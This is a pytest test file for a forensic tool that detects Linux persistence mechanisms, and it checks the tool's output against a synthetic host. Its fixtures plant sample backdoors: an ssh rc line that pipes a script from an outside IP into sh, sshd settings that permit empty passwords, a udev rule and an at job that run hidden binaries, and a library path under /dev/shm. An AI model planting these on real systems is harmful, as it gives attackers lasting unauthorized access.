"""v0.7.149: persistence vectors around login and the system's plumbing -- sshd
settings, ~/.ssh/rc and sshrc, `at` jobs, udev RUN rules, systemd generators,
ld.so.conf.d and NetworkManager dispatcher scripts. Synthetic host; users and
paths are invented."""
from __future__ import annotations

import csv
import logging
from pathlib import Path
from types import SimpleNamespace

from artifact_engine.handlers import lin_persistence


def _write(base: Path, rel: str, text: str) -> None:
    f = base / rel
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(text, encoding="utf-8")


def _rows(tmp_path: Path) -> list[tuple[str, str, str, str]]:
    ev = tmp_path / "ev"
    base = ev / "[root]"
    _write(base, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\n"
                               "jdoe:x:1000:1000::/home/jdoe:/bin/bash\n")
    _write(base, "etc/ssh/sshd_config",
           "# PermitRootLogin yes\nPermitRootLogin prohibit-password\nPort 22\n"
           "AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys\n")
    _write(base, "etc/ssh/sshd_config.d/50-x.conf",
           "PermitEmptyPasswords yes\nAuthorizedKeysFile /tmp/.k/keys\n")
    _write(base, "etc/ssh/sshd_config.d/notes.txt", "PermitEmptyPasswords yes\n")
    _write(base, "home/jdoe/.ssh/rc", "xauth add $DISPLAY\ncurl -s http://203.0.113.5/x | sh\n")
    _write(base, "var/spool/cron/atjobs/a0001501a2b3c4",
           "#!/bin/sh\numask 22\nSHELL=/bin/sh; export SHELL\ncd /home/jdoe || {\n"
           "/dev/shm/.u/upd\n")
    _write(base, "var/spool/cron/atjobs/.SEQ", "1\n")
    _write(base, "etc/udev/rules.d/99-x.rules",
           'ACTION=="add", SUBSYSTEM=="usb", RUN+="/var/tmp/.h/hook.sh"\n'
           'SUBSYSTEM=="net", ATTR{address}=="aa:bb", NAME="eth0"\n')
    _write(base, "etc/systemd/system-generators/x-gen", "#!/bin/sh\n")
    _write(base, "etc/ld.so.conf.d/x.conf", "/usr/local/lib\n/dev/shm/.l\n")
    _write(base, "etc/NetworkManager/dispatcher.d/20-chrony", "#!/bin/sh\nchronyc onoffline\n")
    out = tmp_path / "out"
    lin_persistence.run(SimpleNamespace(evidence=ev, out=out, log=logging.getLogger("t")))
    with open(out / "persistence.csv", encoding="utf-8", newline="") as fh:
        keep = {"sshd", "ssh_rc", "at_job", "udev", "systemd_generator", "ld_so_conf",
                "nm_dispatcher"}
        return [(r["vector"], r["source"], r["detail"], r["suspicious"])
                for r in csv.DictReader(fh) if r["vector"] in keep]


def test_sshd_settings_are_context_unless_they_open_the_door(tmp_path):
    got = {(src, d): s for v, src, d, s in _rows(tmp_path) if v == "sshd"}
    assert got == {
        ("etc/ssh/sshd_config", "PermitRootLogin prohibit-password"): "",
        ("etc/ssh/sshd_config", "AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys"): "",
        ("etc/ssh/sshd_config.d/50-x.conf", "PermitEmptyPasswords yes"): "yes",
        ("etc/ssh/sshd_config.d/50-x.conf", "AuthorizedKeysFile /tmp/.k/keys"): "yes",
    }


def test_login_scripts_are_listed_with_their_suspicious_lines(tmp_path):
    rows = _rows(tmp_path)
    assert {(d, s) for v, _, d, s in rows if v == "ssh_rc"} == {
        ("", ""), ("curl -s http://203.0.113.5/x | sh", "yes")}


def test_at_jobs_are_in_tasks_not_here(tmp_path):
    """v0.7.168: `at` jobs moved to tasks.csv with the rest of the schedule."""
    assert not [v for v, *_ in _rows(tmp_path) if v == "at_job"]


def test_udev_generators_library_paths_and_dispatchers(tmp_path):
    rows = _rows(tmp_path)
    assert [(d, s) for v, _, d, s in rows if v == "udev"] == [
        ('ACTION=="add", SUBSYSTEM=="usb", RUN+="/var/tmp/.h/hook.sh"', "yes")]
    assert [src for v, src, _, _ in rows if v == "systemd_generator"] == [
        "etc/systemd/system-generators/x-gen"]
    assert {(d, s) for v, _, d, s in rows if v == "ld_so_conf"} == {
        ("/usr/local/lib", ""), ("/dev/shm/.l", "yes")}
    assert [(src, d, s) for v, src, d, s in rows if v == "nm_dispatcher"] == [
        ("etc/NetworkManager/dispatcher.d/20-chrony", "", "")]
